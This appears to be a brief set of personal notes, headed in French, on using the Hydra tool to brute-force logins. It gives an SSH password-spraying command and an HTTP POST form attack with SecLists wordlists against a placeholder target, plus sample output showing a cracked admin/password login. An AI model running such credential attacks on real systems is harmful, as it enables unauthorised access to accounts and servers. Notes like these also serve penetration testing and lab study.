# hydra

## utilisation
### ssh
```shell
cat usernames.txt

optimus
albert
andreas
christine
```

```shell
hydra -L usernames.txt -p 'password_a_tester' {target_ip} ssh
```

### http-post-form

```bash
$ hydra -L /usr/share/seclists/Fuzzing/login_bypass.txt -P /usr/share/seclists/Fuzzing/login_bypass.txt {target_ip} http-post-form "/:username=^USER^&password=^PASS^:Wrong Credentials"


[DATA] attacking http-post-form://{target_ip}:80/:username=^USER^&password=^PASS^:Wrong Credentials
[80][http-post-form] host: {target_ip}   login: admin   password: password
[STATUS] 3761.00 tries/min, 3761 tries in 00:01h, 690128 to do in 03:04h, 16 active
```